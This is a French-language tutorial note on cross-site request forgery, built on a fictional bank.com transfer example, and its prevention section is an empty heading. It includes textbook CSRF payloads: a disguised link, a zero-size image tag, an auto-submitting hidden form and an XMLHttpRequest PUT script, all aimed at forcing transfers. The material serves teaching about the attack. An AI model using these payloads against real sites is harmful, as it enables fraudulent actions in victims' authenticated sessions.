# CSRF (Cross Site Request Forgery) ou XSRF   

Microsoft qualifie ce type d'attaque de "One-Click attack" (attaque en un clic).

## Définition:

CSRF est une attaque qui incitent une victime à executer une requête malveillante
Elle hérite de l'identité et des privilèges de la victime pour exécuter une fonction indésirable en son nom


Pour la plupart des sites, les requêtes du navigateur incluent automatiquement toutes les informations d'identification associées au site, telles que le cookie de session de l'utilisateur, l'adresse IP, les informations d'identification du domaine Windows, etc.

Par conséquent, si l'utilisateur est actuellement authentifié sur le site, ce dernier n'aura aucun moyen de faire la distinction entre la fausse requête envoyée par la victime et une requête légitime envoyée par la victime.


## Exemple: 

Hypothèse : 

Alice utilise un site bancaire pour transferer un m!ontant de 100€ à Bob 

GET http://bank.com/transfer.do?acct=BOB&amount=100 HTTP/1.1

Maria est l'attaquante et incite Alice à lui transferer ce montant plutôt qu'à Bob 


### Scenario avec GET

La requete normal se presente sous cette forme : 
GET http://bank.com/transfer.do?acct=BOB&amount=100 HTTP/1.1

La requete que Maria doit faire executer par Alice est de la forme:

    http://bank.com/transfer.do?acct=MARIA&amount=100000

La technique d'ingénierie sociale que doit utilisé Maria doit être: 
-envoi d'un courrier électronique non sollicité avec un contenu HTML en plaçant une URL ou un script d'exploitation sur des pages susceptibles d'être visitées par la victime pendant qu'elle effectue des opérations bancaires en ligne.

La requete originale peut être dissimulé sous ces formes :

    '''<a href="http://bank.com/transfer.do?acct=MARIA&amount=100000">View my Pictures!</a>'''

Ou une fausse image de dimension 0x0 :

    '''<img src="http://bank.com/transfer.do?acct=MARIA&amount=100000" width="0" height="0" border="0">'''

###  Scenario avec POST:

Requete d'origine: 

```
POST http://bank.com/transfer.do HTTP/1.1

acct=BOB&amount=100
```

Maria doit dissimuler la requete avec un formulaire

```html
<form action="http://bank.com/transfer.do" method="POST">

<input type="hidden" name="acct" value="MARIA"/>
<input type="hidden" name="amount" value="100000"/>
<input type="submit" value="View my pictures"/>

</form>
``` 

Ce formulaire exige que l'utilisateur clique sur le bouton de soumission, mais cette opération peut également être exécutée automatiquement à l'aide de JavaScript :

```html
<body onload="document.forms[0].submit()">

<form...> 
```

### Autre méthode HTTP

Les API des applications web modernes utilisent fréquemment d'autres méthodes HTTP, telles que PUT ou DELETE. Supposons que la banque vulnérable utilise la méthode PUT qui prend un bloc JSON comme argument :

```
PUT http://bank.com/transfer.do HTTP/1.1

{ "acct":"BOB", "amount":100 }
```

Ces demandes peuvent être exécutées à l'aide de JavaScript intégré dans une page d'exploitation :
``` http
<script>
function put() {
    var x = new XMLHttpRequest();
    x.open("PUT","http://bank.com/transfer.do",true);
    x.setRequestHeader("Content-Type", "application/json");
    x.send(JSON.stringify({"acct":"BOB", "amount":100})); 
}
</script>

<body onload="put()">
```

**Cette requête ne sera PAS exécutée par les navigateurs web modernes grâce aux restrictions de la politique de même origine (CORS).**

Cette restriction est activée par défaut, à moins que le site web cible n'ouvre explicitement les requêtes cross-origin à partir de l'origine de l'attaquant (ou de tout le monde) en utilisant CORS avec l'en-tête suivant :

Access-Control-Allow-Origin : *


## Mesure qui ne fonctionne PAS:

- Cookie secret
- Utilisation de requete POST
- Les transactions en plusieurs étapes ne constituent pas une prévention adéquate de CSRF. Tant qu'un attaquant peut prédire ou déduire chaque étape de la transaction terminée, le CSRF est possible.
- Verification du referer 
- HTTPS


## Mesure de prévention





